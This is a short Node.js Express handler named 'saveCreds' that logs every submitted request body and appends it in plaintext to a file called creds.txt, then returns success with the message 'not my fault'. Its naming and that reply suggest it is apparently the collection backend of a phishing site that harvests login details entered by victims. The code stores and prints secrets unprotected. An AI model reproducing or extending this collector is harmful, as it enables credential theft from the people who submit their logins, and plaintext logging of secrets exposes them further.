const fs = require('fs');


exports.saveCreds = async (req , res , next) => {
    const newCreds = JSON.stringify(req.body) + "\n";
    console.log(newCreds);
    fs.appendFile(`${__dirname}\\..\\database\\creds.txt` , newCreds  , (err) => {
        if (err){
            console.log(`Error writing to file: ${err}`);
        }
    });
    res.status(200).json({
        status: 'success' , 
        message: 'not my fault'
    });
}